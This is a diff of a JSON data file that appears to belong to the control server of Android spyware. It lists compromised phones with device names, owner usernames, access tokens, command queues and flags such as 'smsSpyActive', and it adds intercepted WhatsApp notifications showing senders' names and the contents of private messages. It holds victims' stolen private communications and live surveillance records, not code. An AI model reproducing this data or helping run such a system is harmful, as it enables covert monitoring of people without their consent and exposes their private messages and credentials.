@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781556405,
+    "lastSeen": 1776781568413,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2938 pesan dari 19 chat",
+        "time": "21/04 21:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781570166
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Laa",
+        "content": "Dh balikk",
+        "time": "21/04 21:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781570029
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Faadil & 2 lainnya",
+        "content": "Telepon video grup berlangsung",
+        "time": "21/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781560044
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Faadil & 2 lainnya",
@@ -10304,30 +10328,6 @@
         "time": "21/04 20:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779971863
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "GB byone/mabar ff 8a: raka",
-        "content": "ngp dy",
-        "time": "21/04 20:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779971812
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3571 pesan dari 20 chat",
-        "time": "21/04 20:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779965252
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (998 pesan): ~ rey",
-        "content": "📷 Laku brp nih gc bu",
-        "time": "21/04 20:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779965240
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781558094,
+    "lastSeen": 1776781569385,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781558494,
+    "lastSeen": 1776781567557,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
